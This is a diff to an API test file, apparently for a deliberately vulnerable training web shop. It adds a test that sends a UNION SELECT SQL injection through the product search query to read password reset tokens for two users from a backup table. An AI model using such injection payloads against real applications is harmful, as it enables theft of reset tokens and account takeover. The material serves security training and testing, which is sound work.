@@ -6,6 +6,7 @@
 import * as frisby from 'frisby'
 import { expect } from '@jest/globals'
 import * as security from '../../lib/insecurity'
+import { createResetPasswordToken } from '../../lib/resetPasswordTokenUtils'
 import type { Product as ProductConfig } from '../../lib/config.types'
 import config from 'config'
 
@@ -127,6 +128,22 @@ describe('/rest/products/search', () => {
       })
       .expect('json', 'data.?', {
         id: 'CREATE TABLE sqlite_sequence(name,seq)'
+      })
+  })
+
+  it('GET product search can inspect the legacy reset token backup table via UNION SELECT', () => {
+    const appDomain = config.get<string>('application.domain')
+
+    return frisby.get(`${REST_URL}/products/search?q=')) union select UserId,'2','3',token,expiresAt,'6','7','8','9' from PasswordResetToken_BACKUP--`)
+      .expect('status', 200)
+      .expect('header', 'content-type', /application\/json/)
+      .expect('json', 'data.?', {
+        id: 2,
+        price: createResetPasswordToken(`jim@${appDomain}`)
+      })
+      .expect('json', 'data.?', {
+        id: 3,
+        price: createResetPasswordToken(`bender@${appDomain}`)
       })
   })
 
